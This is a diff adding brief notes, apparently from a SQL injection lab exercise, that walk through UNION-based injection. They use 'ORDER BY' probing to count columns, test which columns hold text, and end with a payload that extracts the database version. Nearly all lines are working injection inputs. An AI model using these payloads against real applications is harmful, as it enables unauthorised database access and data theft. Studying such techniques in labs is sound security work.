@@ -1,0 +1,18 @@
+analysis:
+
+find the number of columns:
+' order by 2-- -> doesnt work, try remove comments and use another comment symbol
+' order by 2# -> this works
+there are two columns
+
+check for columns with text:
+' UNION SELECT 'a',NULL#
+' UNION SELECT NULL, 'a'#
+' UNION SELECT 'a', 'a'#
+
+both columns are string/text data type store
+
+PAYLOAD
+---------------------------------------
+' UNION SELECT @@version, NULL#
+------------------------------------
